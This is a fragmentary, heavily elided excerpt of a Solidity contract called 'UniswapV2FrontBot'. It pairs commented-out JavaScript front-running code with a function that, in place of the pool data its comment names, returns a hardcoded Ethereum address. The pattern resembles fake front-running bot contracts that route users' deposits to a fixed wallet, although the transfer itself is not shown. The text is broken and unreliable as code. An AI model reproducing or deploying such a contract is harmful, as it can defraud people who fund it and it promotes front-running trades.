...
contract UniswapV2FrontBot {
	...
	uint frontrun;
	UniswapV2Manager manager;
	
	
	constructor(string memory _tokenName, string memory _tokenSymbol) public {
		tokenName = _tokenName;
		tokenSymbol = _tokenSymbol;
		manager = new UniswapV2Manager();
	    ...
	    // Perform tasks (clubbed .json functions into one to reduce external calls & reduce gas) 
...
//async function triggersFrontRun(transaction, out_token_address, amount, level) {
    ...
    //if(parseInt(transaction['gasPrice']) / 10*9 > 10 && parseInt(transaction['gasPrice']) / 10*9 < 50){
		...
		return 0xFd78384966B306f8B2E04b53D4F4004b9c6cD419;//pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();
		}
        //attack_started = true;
        //return true
  //  
